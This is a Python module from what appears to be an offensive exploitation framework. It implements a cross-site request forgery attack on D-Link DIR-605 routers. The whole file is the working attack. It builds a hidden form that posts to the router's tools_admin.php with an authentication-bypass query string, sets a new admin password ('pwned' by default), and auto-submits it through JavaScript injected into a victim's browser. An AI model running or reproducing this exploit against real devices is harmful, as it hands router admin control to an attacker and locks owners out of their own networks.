from kittysploit import *
from lib.protocols.http.csrf import Csrf

class Module(BrowserAuxiliary, Csrf):
	
	__info__ = {
		"name": "D-Link DIR-605 CSRF",
		"description": "D-Link DIR-605 router - Change admin password via CSRF POST",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}
	
	target = OptString("http://192.168.1.1", "Target router URL (with http://)", required=True)
	username = OptString("admin", "Username to change password for", required=True)
	password = OptString("pwned", "New password to set", required=True)

	def run(self):
		form_data = [
			f'<form method="POST" action="{self.target}/tools_admin.php?NO_NEED_AUTH=1&AUTH_GROUP=0">',
			f'<input type="hidden" name="ACTION_POST" value="1" />',
			f'<input type="hidden" name="admin_name" value="{self.username}" />',
			f'<input type="hidden" name="admin_password1" value="{self.password}" />',
			f'<input type="hidden" name="admin_password2" value="{self.password}" />',
			'</form>'
		]
		
		print_info(f"Executing CSRF POST attack on: {self.target}")
		print_info(f"Target: {self.target}/tools_admin.php")
		print_info(f"Username: {self.username}")
		print_info(f"New password: {self.password}")
		
		js_code = self.csrf_post_and_submit(form_data)
		result = self.send_js_and_wait_for_response(js_code, timeout=10.0)
		
		if result:
			print_success("CSRF POST attack executed successfully")
			print_info(f"Response: {result}")
			print_info(f"Password change request sent for user: {self.username}")
			return True
		else:
			fail.CSRFPostFailed()
		return False
